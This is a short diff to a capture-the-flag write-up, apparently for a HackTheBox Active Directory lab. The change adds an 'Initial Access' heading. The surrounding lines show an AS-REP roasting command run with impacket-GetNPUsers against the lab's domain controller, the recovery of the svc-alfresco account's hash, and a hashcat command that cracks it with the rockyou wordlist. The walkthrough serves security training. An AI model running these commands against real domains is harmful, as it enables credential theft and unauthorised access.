@@ -67,6 +67,8 @@ impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users
 
 ![as-rep](Images/as-rep)
 
+## Initial Access
+
 I was able to successfully obtain the hashed password for the `svc-alfresco` user. Now this hash can be saved locally and taken offline for password cracking using the tool `Hashcat`
 ```
 hashcat -m 18200 alfresco.hash /usr/share/wordlists/rockyou.txt
